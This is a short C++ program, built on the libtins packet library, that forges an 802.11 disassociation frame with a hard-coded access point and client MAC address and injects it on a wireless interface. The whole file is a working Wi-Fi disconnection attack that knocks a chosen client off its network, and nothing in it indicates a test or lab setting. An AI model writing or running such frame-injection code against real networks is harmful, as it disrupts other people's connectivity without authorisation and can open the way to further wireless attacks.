#include <iostream>
#include <tins/tins.h>

using namespace Tins;
using namespace std;

int main(int argc, char *argv[])
{
    Dot11::address_type AP = "00:07:89:32:0a:9f";
    Dot11::address_type station = "10:68:3f:8f:0b:77";
    Dot11Disassoc disas(station, AP);


    RadioTap tap = RadioTap() / disas;

    PacketSender sender("net0");
    sender.send(tap);
    return 0;
}
